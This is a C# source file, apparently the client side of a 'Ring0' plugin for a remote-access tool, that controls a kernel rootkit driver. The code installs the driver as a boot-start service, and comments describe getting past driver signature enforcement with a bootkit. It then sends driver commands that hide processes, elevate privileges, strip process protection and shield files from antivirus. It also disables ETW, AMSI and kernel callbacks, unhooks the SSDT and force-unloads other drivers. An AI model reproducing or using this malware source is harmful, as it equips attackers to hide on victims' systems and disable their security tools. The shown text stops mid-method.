using System;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using Pulsar.Plugin.Ring0.Common;

namespace Pulsar.Plugin.Ring0.Client
{
    /// <summary>
    /// Ring0 driver installation, connection, and IOCTL interface
    /// </summary>
    public class ChaosDriver : IDisposable
    {
        #region Native Imports

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr CreateFileW(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool DeviceIoControl(
            IntPtr hDevice,
            uint dwIoControlCode,
            IntPtr lpInBuffer,
            uint nInBufferSize,
            IntPtr lpOutBuffer,
            uint nOutBufferSize,
            out uint lpBytesReturned,
            IntPtr lpOverlapped);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr OpenSCManagerW(string lpMachineName, string lpDatabaseName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr CreateServiceW(
            IntPtr hSCManager,
            string lpServiceName,
            string lpDisplayName,
            uint dwDesiredAccess,
            uint dwServiceType,
            uint dwStartType,
            uint dwErrorControl,
            string lpBinaryPathName,
            string lpLoadOrderGroup,
            IntPtr lpdwTagId,
            string lpDependencies,
            string lpServiceStartName,
            string lpPassword);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern IntPtr OpenServiceW(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool StartServiceW(IntPtr hService, uint dwNumServiceArgs, IntPtr lpServiceArgVectors);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool DeleteService(IntPtr hService);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool ControlService(IntPtr hService, uint dwControl, out SERVICE_STATUS lpServiceStatus);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool QueryServiceStatus(IntPtr hService, out SERVICE_STATUS lpServiceStatus);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool CloseServiceHandle(IntPtr hSCObject);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool ChangeServiceConfigW(
            IntPtr hService,
            uint dwServiceType,
            uint dwStartType,
            uint dwErrorControl,
            string lpBinaryPathName,
            string lpLoadOrderGroup,
            IntPtr lpdwTagId,
            string lpDependencies,
            string lpServiceStartName,
            string lpPassword,
            string lpDisplayName);

        [StructLayout(LayoutKind.Sequential)]
        private struct SERVICE_STATUS
        {
            public uint dwServiceType;
            public uint dwCurrentState;
            public uint dwControlsAccepted;
            public uint dwWin32ExitCode;
            public uint dwServiceSpecificExitCode;
            public uint dwCheckPoint;
            public uint dwWaitHint;
        }

        private const uint SC_MANAGER_ALL_ACCESS = 0xF003F;
        private const uint SERVICE_ALL_ACCESS = 0xF01FF;
        private const uint SERVICE_KERNEL_DRIVER = 0x1;
        private const uint SERVICE_BOOT_START = 0x0;
        private const uint SERVICE_DEMAND_START = 0x3;
        private const uint SERVICE_ERROR_IGNORE = 0x0;
        private const uint SERVICE_CONTROL_STOP = 0x1;
        private const uint SERVICE_RUNNING = 0x4;
        private const uint SERVICE_STOPPED = 0x1;
        private const uint SERVICE_NO_CHANGE = 0xFFFFFFFF;
        private const uint SC_MANAGER_CONNECT = 0x0001;
        private const uint SERVICE_QUERY_STATUS = 0x0004;

        private const uint GENERIC_READ = 0x80000000;
        private const uint GENERIC_WRITE = 0x40000000;
        private const uint OPEN_EXISTING = 3;
        private const uint FILE_SHARE_READ = 0x1;
        private const uint FILE_SHARE_WRITE = 0x2;

        private static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

        #endregion

        private IntPtr _deviceHandle = INVALID_HANDLE_VALUE;
        private readonly Action<string> _log;
        private bool _disposed;

        public bool IsConnected => _deviceHandle != INVALID_HANDLE_VALUE && _deviceHandle != IntPtr.Zero;

        public ChaosDriver(Action<string> logger = null)
        {
            _log = logger;
        }

        /// <summary>
        /// Log essential message - visible to customer
        /// </summary>
        private void Log(string msg) => _log?.Invoke($"[Ring0Drv] {msg}");
        
        /// <summary>
        /// Log verbose/debug message - DEBUG builds only
        /// </summary>
        [System.Diagnostics.Conditional("DEBUG")]
        private void LogVerbose(string msg)
        {
#if DEBUG
            _log?.Invoke($"[Ring0Drv] {msg}");
#endif
        }

        /// <summary>
        /// Check if driver service exists
        /// </summary>
        public bool IsDriverInstalled()
        {
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey($@"SYSTEM\CurrentControlSet\Services\{Ring0Commands.SERVICE_NAME}"))
                {
                    return key != null;
                }
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Check if driver is currently loaded/running
        /// </summary>
        public bool IsDriverRunning()
        {
            IntPtr scm = OpenSCManagerW(null, null, SC_MANAGER_ALL_ACCESS);
            if (scm == IntPtr.Zero) return false;

            try
            {
                IntPtr service = OpenServiceW(scm, Ring0Commands.SERVICE_NAME, SERVICE_ALL_ACCESS);
                if (service == IntPtr.Zero) return false;

                try
                {
                    if (QueryServiceStatus(service, out SERVICE_STATUS status))
                    {
                        return status.dwCurrentState == SERVICE_RUNNING;
                    }
                }
                finally
                {
                    CloseServiceHandle(service);
                }
            }
            finally
            {
                CloseServiceHandle(scm);
            }

            return false;
        }

        /// <summary>
        /// Get detailed driver diagnostic information
        /// </summary>
        public DriverDiagnostics GetDiagnostics()
        {
            var diag = new DriverDiagnostics();
            string driverPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers", Ring0Commands.DRIVER_FILE);

            // Check driver file
            if (File.Exists(driverPath))
            {
                var fi = new FileInfo(driverPath);
                diag.DriverFileExists = true;
                diag.DriverFileSize = fi.Length;
                diag.DriverFilePath = fi.FullName;
            }

            // Check service registry
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey($@"SYSTEM\CurrentControlSet\Services\{Ring0Commands.SERVICE_NAME}"))
                {
                    if (key != null)
                    {
                        diag.ServiceExists = true;
                        diag.ServiceStartType = Convert.ToInt32(key.GetValue("Start", -1));
                        diag.ServiceImagePath = key.GetValue("ImagePath")?.ToString();
                        diag.ServiceGroup = key.GetValue("Group")?.ToString();
                        diag.ServiceErrorControl = Convert.ToInt32(key.GetValue("ErrorControl", -1));
                    }
                }
            }
            catch (Exception ex)
            {
                diag.ServiceError = ex.Message;
            }

            // Check if service is running
            IntPtr scm = OpenSCManagerW(null, null, SC_MANAGER_CONNECT);
            if (scm != IntPtr.Zero)
            {
                try
                {
                    IntPtr service = OpenServiceW(scm, Ring0Commands.SERVICE_NAME, SERVICE_QUERY_STATUS);
                    if (service != IntPtr.Zero)
                    {
                        try
                        {
                            if (QueryServiceStatus(service, out SERVICE_STATUS status))
                            {
                                diag.ServiceState = status.dwCurrentState;
                                diag.ServiceStateText = GetServiceStateText(status.dwCurrentState);
                            }
                        }
                        finally
                        {
                            CloseServiceHandle(service);
                        }
                    }
                    else
                    {
                        diag.ServiceOpenError = Marshal.GetLastWin32Error();
                    }
                }
                finally
                {
                    CloseServiceHandle(scm);
                }
            }

            // Try to open device handle
            IntPtr testHandle = CreateFileW(
                Ring0Commands.DEVICE_NAME,
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                IntPtr.Zero,
                OPEN_EXISTING,
                0,
                IntPtr.Zero);

            if (testHandle != INVALID_HANDLE_VALUE)
            {
                diag.DeviceAccessible = true;
                CloseHandle(testHandle);
            }
            else
            {
                diag.DeviceOpenError = Marshal.GetLastWin32Error();
            }

            // Check DSE status
            var dse = SystemChecks.CheckDSE();
            diag.DseEnabled = dse.DseEnabled;
            diag.TestSigningEnabled = dse.TestSigningEnabled;
            diag.HvciEnabled = dse.HvciEnabled;

            return diag;
        }

        private string GetServiceStateText(uint state)
        {
            switch (state)
            {
                case 1: return "STOPPED";
                case 2: return "START_PENDING";
                case 3: return "STOP_PENDING";
                case 4: return "RUNNING";
                case 5: return "CONTINUE_PENDING";
                case 6: return "PAUSE_PENDING";
                case 7: return "PAUSED";
                default: return $"UNKNOWN({state})";
            }
        }

        public class DriverDiagnostics
        {
            public bool DriverFileExists { get; set; }
            public long DriverFileSize { get; set; }
            public string DriverFilePath { get; set; }
            
            public bool ServiceExists { get; set; }
            public int ServiceStartType { get; set; }
            public string ServiceImagePath { get; set; }
            public string ServiceGroup { get; set; }
            public int ServiceErrorControl { get; set; }
            public string ServiceError { get; set; }
            
            public uint ServiceState { get; set; }
            public string ServiceStateText { get; set; }
            public int ServiceOpenError { get; set; }
            
            public bool DeviceAccessible { get; set; }
            public int DeviceOpenError { get; set; }
            
            public bool DseEnabled { get; set; }
            public bool TestSigningEnabled { get; set; }
            public bool HvciEnabled { get; set; }

            public string GetStartTypeText()
            {
                switch (ServiceStartType)
                {
                    case 0: return "BOOT_START";
                    case 1: return "SYSTEM_START";
                    case 2: return "AUTO_START";
                    case 3: return "DEMAND_START";
                    case 4: return "DISABLED";
                    default: return $"UNKNOWN({ServiceStartType})";
                }
            }

            public override string ToString()
            {
                var sb = new System.Text.StringBuilder();
                sb.AppendLine($"Driver File: {(DriverFileExists ? $"YES ({DriverFileSize} bytes)" : "NO")}");
                if (DriverFileExists)
                    sb.AppendLine($"  Path: {DriverFilePath}");
                
                sb.AppendLine($"Service: {(ServiceExists ? "YES" : "NO")}");
                if (ServiceExists)
                {
                    sb.AppendLine($"  StartType: {GetStartTypeText()}");
                    sb.AppendLine($"  ImagePath: {ServiceImagePath}");
                    sb.AppendLine($"  Group: {ServiceGroup ?? "(none)"}");
                    sb.AppendLine($"  State: {ServiceStateText}");
                }
                if (!string.IsNullOrEmpty(ServiceError))
                    sb.AppendLine($"  Error: {ServiceError}");
                if (ServiceOpenError != 0)
                    sb.AppendLine($"  OpenError: {ServiceOpenError}");
                
                sb.AppendLine($"Device: {(DeviceAccessible ? "ACCESSIBLE" : $"NOT ACCESSIBLE (error {DeviceOpenError})")}");
                
                sb.AppendLine($"DSE: {(DseEnabled ? "ENABLED" : "DISABLED")}");
                sb.AppendLine($"TestSigning: {(TestSigningEnabled ? "ENABLED" : "DISABLED")}");
                sb.AppendLine($"HVCI: {(HvciEnabled ? "ENABLED" : "DISABLED")}");
                
                return sb.ToString();
            }
        }

        /// <summary>
        /// Install driver as Boot Start service for Elysium DSE bypass
        /// </summary>
        public bool InstallDriver(byte[] driverBytes, bool bootStart = true)
        {
            string driverPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers", Ring0Commands.DRIVER_FILE);

            try
            {
                // IMPORTANT: Uninstall existing service FIRST, before writing the new driver file
                // (UninstallDriver deletes the old driver file, so we must write after)
                UninstallDriver();

                // Write driver to System32\drivers
                LogVerbose($"Writing driver ({driverBytes.Length} bytes) to {driverPath}");
                File.WriteAllBytes(driverPath, driverBytes);
                
                // Verify file was written
                if (File.Exists(driverPath))
                {
                    var fi = new FileInfo(driverPath);
                    LogVerbose($"Driver file written: {fi.Length} bytes at {fi.FullName}");
                }
                else
                {
                    LogVerbose("ERROR: Driver file was NOT written!");
                    return false;
                }

                // Create service
                IntPtr scm = OpenSCManagerW(null, null, SC_MANAGER_ALL_ACCESS);
                if (scm == IntPtr.Zero)
                {
                    int error = Marshal.GetLastWin32Error();
                    LogVerbose($"OpenSCManager failed: error {error} - need admin rights");
                    return false;
                }

                try
                {
                    uint startType = bootStart ? SERVICE_BOOT_START : SERVICE_DEMAND_START;
                    string binPath = $@"System32\drivers\{Ring0Commands.DRIVER_FILE}";

                    LogVerbose($"Creating service: Name={Ring0Commands.SERVICE_NAME}, StartType={(bootStart ? "BOOT_START(0)" : "DEMAND_START(3)")}, Path={binPath}");

                    IntPtr service = CreateServiceW(
                        scm,
                        Ring0Commands.SERVICE_NAME,
                        Ring0Commands.DRIVER_NAME,
                        SERVICE_ALL_ACCESS,
                        SERVICE_KERNEL_DRIVER,
                        startType,
                        SERVICE_ERROR_IGNORE,
                        binPath,
                        null, IntPtr.Zero, null, null, null);

                    if (service == IntPtr.Zero)
                    {
                        int error = Marshal.GetLastWin32Error();
                        LogVerbose($"CreateService failed: error {error}");
                        return false;
                    }

                    CloseServiceHandle(service);
                    
                    // For BOOT_START, set load order group so it actually loads during boot
                    using (var key = Registry.LocalMachine.OpenSubKey($@"SYSTEM\CurrentControlSet\Services\{Ring0Commands.SERVICE_NAME}", true))
                    {
                        if (key != null)
                        {
                            if (bootStart)
                            {
                                // "Base" group loads early enough for our driver
                                key.SetValue("Group", "Base", RegistryValueKind.String);
                                LogVerbose("Set load order group: Base");
                            }
                            
                            var start = key.GetValue("Start");
                            var imagePath = key.GetValue("ImagePath");
                            LogVerbose($"Service created: Start={start}, ImagePath={imagePath}");
                        }
                        else
                        {
                            LogVerbose("WARNING: Service registry key not found after creation");
                        }
                    }

                    LogVerbose($"SUCCESS: Driver installed as {(bootStart ? "BOOT_START" : "DEMAND_START")}");

                    if (bootStart)
                    {
                        LogVerbose("Driver will load on next reboot (requires DSE bypass via bootkit or test signing)");
                    }

                    return true;
                }
                finally
                {
                    CloseServiceHandle(scm);
                }
            }
            catch (Exception ex)
            {
                LogVerbose($"InstallDriver exception: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Start driver service - handles both BOOT_START and DEMAND_START
        /// </summary>
        public bool StartDriver()
        {
            IntPtr scm = OpenSCManagerW(null, null, SC_MANAGER_ALL_ACCESS);
            if (scm == IntPtr.Zero)
            {
                LogVerbose($"OpenSCManager failed: {Marshal.GetLastWin32Error()}");
                return false;
            }

            try
            {
                IntPtr service = OpenServiceW(scm, Ring0Commands.SERVICE_NAME, SERVICE_ALL_ACCESS);
                if (service == IntPtr.Zero)
                {
                    int error = Marshal.GetLastWin32Error();
                    LogVerbose($"OpenService failed: {error}");
                    
                    // Service doesn't exist - try to create as DEMAND_START
                    if (error == 1060) // ERROR_SERVICE_DOES_NOT_EXIST
                    {
                        LogVerbose("Service not found, will need to reinstall driver");
                    }
                    return false;
                }

                try
                {
                    if (QueryServiceStatus(service, out SERVICE_STATUS status))
                    {
                        if (status.dwCurrentState == SERVICE_RUNNING)
                        {
                            LogVerbose("Driver already running");
                            return true;
                        }
                    }

                    // Try to start the service
                    if (!StartServiceW(service, 0, IntPtr.Zero))
                    {
                        int error = Marshal.GetLastWin32Error();
                        LogVerbose($"StartService failed: error {error}");
                        
                        // Error 1058 = service cannot be started (BOOT_START can't be manually started)
                        // Error 577 = signature verification failed (DSE still on)
                        // Error 1275 = driver blocked from loading
                        if (error == 1058 || error == 1275)
                        {
                            LogVerbose("BOOT_START driver - changing to DEMAND_START for manual load...");
                            
                            // Change to DEMAND_START so we can start it manually
                            if (ChangeServiceConfigW(service, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, 
                                SERVICE_NO_CHANGE, null, null, IntPtr.Zero, null, null, null, null))
                            {
                                LogVerbose("Changed to DEMAND_START, retrying...");
                                if (StartServiceW(service, 0, IntPtr.Zero))
                                {
                                    Log("Driver started successfully after config change");
                                    return true;
                                }
                                error = Marshal.GetLastWin32Error();
                                LogVerbose($"StartService still failed: error {error}");
                            }
                        }
                        
                        if (error == 577)
                        {
                            LogVerbose("ERROR 577: Driver signature verification failed - DSE is still enforced!");
                        }
                        
                        return false;
                    }

                    Log("Driver started successfully");
                    return true;
                }
                finally
                {
                    CloseServiceHandle(service);
                }
            }
            finally
            {
                CloseServiceHandle(scm);
            }
        }

        /// <summary>
        /// Stop and uninstall driver service
        /// Handles both pre-reboot (service exists, driver not loaded) and post-reboot (driver running) states
        /// </summary>
        public bool UninstallDriver()
        {
            bool serviceDeleted = false;
            bool fileDeleted = false;
            bool registryCleared = false;

            LogVerbose("Starting driver uninstallation...");

            // Step 1: Disconnect from driver if connected
            if (_deviceHandle != IntPtr.Zero && _deviceHandle != INVALID_HANDLE_VALUE)
            {
                LogVerbose("Disconnecting from driver...");
                Disconnect();
            }

            // Step 2: Stop and delete service via SCM
            IntPtr scm = OpenSCManagerW(null, null, SC_MANAGER_ALL_ACCESS);
            if (scm != IntPtr.Zero)
            {
                try
                {
                    IntPtr service = OpenServiceW(scm, Ring0Commands.SERVICE_NAME, SERVICE_ALL_ACCESS);
                    if (service != IntPtr.Zero)
                    {
                        try
                        {
                            // Check service status
                            if (QueryServiceStatus(service, out SERVICE_STATUS status))
                            {
                                LogVerbose($"Service state: {status.dwCurrentState}");
                                
                                // Try to stop if running (state 4 = RUNNING)
                                if (status.dwCurrentState == SERVICE_RUNNING)
                                {
                                    LogVerbose("Stopping running driver...");
                                    if (ControlService(service, SERVICE_CONTROL_STOP, out _))
                                    {
                                        // Wait for stop
                                        for (int i = 0; i < 10; i++)
                                        {
                                            System.Threading.Thread.Sleep(500);
                                            if (QueryServiceStatus(service, out status) && status.dwCurrentState == 1) // STOPPED
                                                break;
                                        }
                                        LogVerbose("Driver stopped");
                                    }
                                    else
                                    {
                                        LogVerbose($"Stop failed (may need reboot): {Marshal.GetLastWin32Error()}");
                                    }
                                }
                            }

                            // Delete service
                            if (DeleteService(service))
                            {
                                Log("Service marked for deletion");
                                serviceDeleted = true;
                            }
                            else
                            {
                                int error = Marshal.GetLastWin32Error();
                                if (error == 1072) // ERROR_SERVICE_MARKED_FOR_DELETE
                                {
                                    Log("Service already marked for deletion");
                                    serviceDeleted = true;
                                }
                                else
                                {
                                    Log($"DeleteService failed: {error}");
                                }
                            }
                        }
                        finally
                        {
                            CloseServiceHandle(service);
                        }
                    }
                    else
                    {
                        LogVerbose("Service not found (already deleted)");
                        serviceDeleted = true;
                    }
                }
                finally
                {
                    CloseServiceHandle(scm);
                }
            }
            else
            {
                LogVerbose($"OpenSCManager failed: {Marshal.GetLastWin32Error()}");
            }

            // Step 3: Clean up registry (handles pre-reboot state where service may still exist)
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services", true))
                {
                    if (key != null)
                    {
                        try
                        {
                            key.DeleteSubKeyTree(Ring0Commands.SERVICE_NAME, false);
                            LogVerbose("Registry service key deleted");
                            registryCleared = true;
                        }
                        catch (Exception ex)
                        {
                            Log($"Registry cleanup: {ex.Message}");
                        }
                    }
                }
            }
            catch { }

            // Step 4: Delete driver file (may fail if driver is loaded - will be deleted on reboot)
            string driverPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers", Ring0Commands.DRIVER_FILE);
            try
            {
                if (File.Exists(driverPath))
                {
                    File.Delete(driverPath);
                    LogVerbose("Driver file deleted");
                    fileDeleted = true;
                }
                else
                {
                    LogVerbose("Driver file not found");
                    fileDeleted = true;
                }
            }
            catch (Exception ex)
            {
                Log($"Cannot delete driver file (in use): {ex.Message}");
                // Schedule for deletion on reboot
                try
                {
                    MoveFileEx(driverPath, null, MOVEFILE_DELAY_UNTIL_REBOOT);
                    Log("Driver file scheduled for deletion on reboot");
                }
                catch { }
            }

            bool success = serviceDeleted || registryCleared;
            LogVerbose($"Uninstall complete: service={serviceDeleted}, registry={registryCleared}, file={fileDeleted}");
            
            return success;
        }

        // For scheduling file deletion on reboot
        private const int MOVEFILE_DELAY_UNTIL_REBOOT = 0x4;
        
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, int dwFlags);

        /// <summary>
        /// Connect to driver device
        /// </summary>
        public bool Connect()
        {
            if (IsConnected) return true;

            _deviceHandle = CreateFileW(
                Ring0Commands.DEVICE_NAME,
                GENERIC_WRITE,
                FILE_SHARE_WRITE,
                IntPtr.Zero,
                OPEN_EXISTING,
                0,
                IntPtr.Zero);

            if (_deviceHandle == INVALID_HANDLE_VALUE || _deviceHandle == IntPtr.Zero)
            {
                int error = Marshal.GetLastWin32Error();
                Log($"Failed to connect to driver: {error}");
                _deviceHandle = INVALID_HANDLE_VALUE;
                return false;
            }

            Log("Connected to Ring0 driver");
            return true;
        }

        /// <summary>
        /// Disconnect from driver
        /// </summary>
        public void Disconnect()
        {
            if (_deviceHandle != INVALID_HANDLE_VALUE && _deviceHandle != IntPtr.Zero)
            {
                CloseHandle(_deviceHandle);
                _deviceHandle = INVALID_HANDLE_VALUE;
                Log("Disconnected from driver");
            }
        }

        #region IOCTL Operations

        /// <summary>
        /// Send IOCTL with int input (PID)
        /// </summary>
        public IoctlResult SendIoctl(uint ioctlCode, int inputValue)
        {
            if (!IsConnected)
                return new IoctlResult { Success = false, Message = "Not connected to driver" };

            // For METHOD_BUFFERED, the same buffer is used for input AND output.
            // The driver reads input, then writes status back to the same buffer.
            // We allocate extra space for the output (at least sizeof(int) for the status).
            int bufferSize = sizeof(int) * 2; // Input + space for output status
            IntPtr buffer = Marshal.AllocHGlobal(bufferSize);
            try
            {
                Marshal.WriteInt32(buffer, inputValue);
                
                bool success = DeviceIoControl(
                    _deviceHandle,
                    ioctlCode,
                    buffer,
                    sizeof(int),
                    buffer,            // Same buffer for output!
                    (uint)bufferSize,  // Output buffer size
                    out uint bytesReturned,
                    IntPtr.Zero);

                if (success)
                {
                    // Read the driver's status from the output buffer
                    int driverStatus = Marshal.ReadInt32(buffer);
                    if (driverStatus == 0)
                        return new IoctlResult { Success = true, Message = "IOCTL sent successfully" };
                    else
                        return new IoctlResult { Success = false, ErrorCode = (uint)driverStatus, Message = $"Driver returned error: 0x{driverStatus:X8}" };
                }
                else
                {
                    uint error = (uint)Marshal.GetLastWin32Error();
                    return new IoctlResult { Success = false, ErrorCode = error, Message = $"IOCTL failed: {error}" };
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        /// <summary>
        /// Send IOCTL with 64-bit input (for HANDLE/IntPtr on x64)
        /// Used for operations that expect sizeof(HANDLE) = 8 bytes
        /// </summary>
        public IoctlResult SendIoctl64(uint ioctlCode, IntPtr inputValue)
        {
            if (!IsConnected)
                return new IoctlResult { Success = false, Message = "Not connected to driver" };

            // 8-byte input (IntPtr/HANDLE on x64) + space for output status
            int bufferSize = sizeof(long) + sizeof(int);
            IntPtr buffer = Marshal.AllocHGlobal(bufferSize);
            try
            {
                Marshal.WriteInt64(buffer, inputValue.ToInt64());
                
                bool success = DeviceIoControl(
                    _deviceHandle,
                    ioctlCode,
                    buffer,
                    sizeof(long),      // 8 bytes for HANDLE
                    buffer,
                    (uint)bufferSize,
                    out uint bytesReturned,
                    IntPtr.Zero);

                if (success)
                {
                    int driverStatus = Marshal.ReadInt32(buffer);
                    if (driverStatus == 0)
                        return new IoctlResult { Success = true, Message = "Success" };
                    else
                        return new IoctlResult { Success = false, ErrorCode = (uint)driverStatus, Message = $"Driver error: 0x{driverStatus:X8}" };
                }
                else
                {
                    uint error = (uint)Marshal.GetLastWin32Error();
                    return new IoctlResult { Success = false, ErrorCode = error, Message = $"IOCTL failed: {error}" };
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        /// <summary>
        /// Send IOCTL with no input
        /// </summary>
        public IoctlResult SendIoctl(uint ioctlCode)
        {
            if (!IsConnected)
                return new IoctlResult { Success = false, Message = "Not connected to driver" };

            // Even with no input, the driver writes status back to the output buffer
            int bufferSize = sizeof(int);
            IntPtr buffer = Marshal.AllocHGlobal(bufferSize);
            try
            {
                bool success = DeviceIoControl(
                    _deviceHandle,
                    ioctlCode,
                    IntPtr.Zero,
                    0,
                    buffer,           // Output buffer for driver status
                    (uint)bufferSize,
                    out uint bytesReturned,
                    IntPtr.Zero);

                if (success)
                {
                    int driverStatus = Marshal.ReadInt32(buffer);
                    if (driverStatus == 0)
                        return new IoctlResult { Success = true, Message = "IOCTL sent successfully" };
                    else
                        return new IoctlResult { Success = false, ErrorCode = (uint)driverStatus, Message = $"Driver returned error: 0x{driverStatus:X8}" };
                }
                else
                {
                    uint error = (uint)Marshal.GetLastWin32Error();
                    return new IoctlResult { Success = false, ErrorCode = error, Message = $"IOCTL failed: {error}" };
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        /// <summary>
        /// Send IOCTL with FileOperation struct
        /// </summary>
        public IoctlResult SendFileIoctl(uint ioctlCode, int pid, string filename)
        {
            if (!IsConnected)
                return new IoctlResult { Success = false, Message = "Not connected to driver" };

            var fileOp = new FileOperation { Pid = pid, Filename = filename };
            int size = Marshal.SizeOf<FileOperation>();
            // Allocate extra space for output status
            int bufferSize = Math.Max(size, sizeof(int) + size);
            IntPtr buffer = Marshal.AllocHGlobal(bufferSize);

            try
            {
                Marshal.StructureToPtr(fileOp, buffer, false);

                bool success = DeviceIoControl(
                    _deviceHandle,
                    ioctlCode,
                    buffer,
                    (uint)size,
                    buffer,           // Same buffer for output
                    (uint)bufferSize,
                    out uint bytesReturned,
                    IntPtr.Zero);

                if (success)
                {
                    int driverStatus = Marshal.ReadInt32(buffer);
                    if (driverStatus == 0)
                        return new IoctlResult { Success = true, Message = "IOCTL sent successfully" };
                    else
                        return new IoctlResult { Success = false, ErrorCode = (uint)driverStatus, Message = $"Driver returned error: 0x{driverStatus:X8}" };
                }
                else
                {
                    uint error = (uint)Marshal.GetLastWin32Error();
                    return new IoctlResult { Success = false, ErrorCode = error, Message = $"IOCTL failed: {error}" };
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        /// <summary>
        /// Send IOCTL with SetProtectionCommand struct
        /// </summary>
        public IoctlResult SendProtectionIoctl(int pid, ProtectionType type, ProtectionSigner signer)
        {
            if (!IsConnected)
                return new IoctlResult { Success = false, Message = "Not connected to driver" };

            var cmd = new SetProtectionCommand
            {
                Protection = new PS_PROTECTION(),
                ProcessHandle = new IntPtr(pid)
            };
            cmd.Protection.Type = type;
            cmd.Protection.Signer = signer;

            int size = Marshal.SizeOf<SetProtectionCommand>();
            int bufferSize = Math.Max(size, sizeof(int) + size);
            IntPtr buffer = Marshal.AllocHGlobal(bufferSize);

            try
            {
                Marshal.StructureToPtr(cmd, buffer, false);

                bool success = DeviceIoControl(
                    _deviceHandle,
                    ChaosIoctl.SET_PROTECTION_LEVEL,
                    buffer,
                    (uint)size,
                    buffer,           // Same buffer for output
                    (uint)bufferSize,
                    out uint bytesReturned,
                    IntPtr.Zero);

                if (success)
                {
                    int driverStatus = Marshal.ReadInt32(buffer);
                    if (driverStatus == 0)
                        return new IoctlResult { Success = true, Message = "Protection set successfully" };
                    else
                        return new IoctlResult { Success = false, ErrorCode = (uint)driverStatus, Message = $"Driver returned error: 0x{driverStatus:X8}" };
                }
                else
                {
                    uint error = (uint)Marshal.GetLastWin32Error();
                    return new IoctlResult { Success = false, ErrorCode = error, Message = $"IOCTL failed: {error}" };
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        // Convenience methods for specific operations

        public IoctlResult HideProcess(int pid) => SendIoctl(ChaosIoctl.HIDE_PROC, pid);
        public IoctlResult ElevateProcess(int pid) => SendIoctl(ChaosIoctl.PRIVILEGE_ELEVATION, pid);
        public IoctlResult UnprotectAll() => SendIoctl(ChaosIoctl.UNPROTECT_ALL_PROCESSES);
        public IoctlResult SwapDriver() => SendIoctl(ChaosIoctl.ZWSWAPCERT);
        public IoctlResult RestrictFile(int allowedPid, string filename) => SendFileIoctl(ChaosIoctl.RESTRICT_ACCESS_TO_FILE, allowedPid, filename);
        public IoctlResult BypassIntegrity(string filename) => SendFileIoctl(ChaosIoctl.BYPASS_INTEGRITY_FILE, 0, filename);
        public IoctlResult ProtectFileAV(string filename) => SendFileIoctl(ChaosIoctl.PROTECT_FILE_AGAINST_AV, 0, filename);
        public IoctlResult SetProtection(int pid, ProtectionType type, ProtectionSigner signer) => SendProtectionIoctl(pid, type, signer);

        // ================================================================
        // AV/EDR Bypass Methods
        // ================================================================
        
        public IoctlResult KillEtw() => SendIoctl(ChaosIoctl.KILL_ETW);
        public IoctlResult KillAmsi(int pid = 0) => SendIoctl64(ChaosIoctl.KILL_AMSI, (IntPtr)pid);
        public IoctlResult KillProcessCallbacks() => SendIoctl(ChaosIoctl.KILL_PROCESS_CALLBACKS);
        public IoctlResult KillThreadCallbacks() => SendIoctl(ChaosIoctl.KILL_THREAD_CALLBACKS);
        public IoctlResult KillImageCallbacks() => SendIoctl(ChaosIoctl.KILL_IMAGE_CALLBACKS);
        public IoctlResult KillRegistryCallbacks() => SendIoctl(ChaosIoctl.KILL_REGISTRY_CALLBACKS);
        public IoctlResult KillAllCallbacks() => SendIoctl(ChaosIoctl.KILL_ALL_CALLBACKS);
        public IoctlResult UnhookSsdt() => SendIoctl(ChaosIoctl.UNHOOK_SSDT);

        public IoctlResult ForceUnloadDriver(string driverName)
        {
            if (!IsConnected)
                return new IoctlResult { Success = false, Message = "Not connected to driver" };

            var req = new DriverUnloadRequest { DriverName = driverName };
            int size = Marshal.SizeOf<DriverUnloadRequest>();
            int bufferSize = Math.Max(size, sizeof(int) + size);
            IntPtr buffer = Marshal.AllocHGlobal(bufferSize);

            try
            {
                Marshal.StructureToPtr(req, buffer, false);

                bool success = DeviceIoControl(
                    _deviceHandle,
                    ChaosIoctl.FORCE_UNLOAD_DRIVER,
                    buffer,
                    (uint)size,
                    buffer,
                    (uint)bufferSize,
                    out _,
                    IntPtr.Zero);

                if (success)
                {
                    int driverStatus = Marshal.ReadInt32(buffer);
                    if (driverStatus == 0)
                        return new IoctlResult { Success = true, Message = $"Driver {driverName} unloaded" };
                    else
